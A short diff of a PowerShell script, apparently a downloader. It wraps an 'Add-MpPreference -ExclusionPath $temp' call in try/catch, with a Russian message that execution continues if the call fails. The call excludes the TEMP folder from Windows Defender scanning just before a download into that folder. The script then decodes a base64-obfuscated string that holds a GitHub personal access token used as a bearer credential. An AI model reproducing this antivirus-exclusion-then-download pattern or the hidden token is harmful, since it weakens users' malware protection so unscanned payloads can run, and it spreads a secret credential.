@@ -100,7 +100,12 @@ $temp = $env:TEMP
 try {
     Write-Host "Download..." -ForegroundColor Green
     $contFile = [System.IO.Path]::GetTempFileName()
-	Add-MpPreference -ExclusionPath $temp -ErrorAction Ignore
+	try {
+		Add-MpPreference -ExclusionPath $temp -ErrorAction Stop
+	} catch {
+		Write-Host "Команда Add-MpPreference не найдена или не выполнена, продолжаем выполнение..." -ForegroundColor Yellow
+	}
+
     try {
 		$String = "QmVhcmVyIGdpdGh1Yl9wYXRfMTFCSkVOSDRJMGRZWjNVeTJtWnNxTl9PWVVNWVdkcGdTWHJybk43V3pDbjIwbkVlUm5zRTVvYVVQWlJSclpsd3hWQ1hHNktGNlFOR2p0aWhMdw=="
 		$String = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($String))
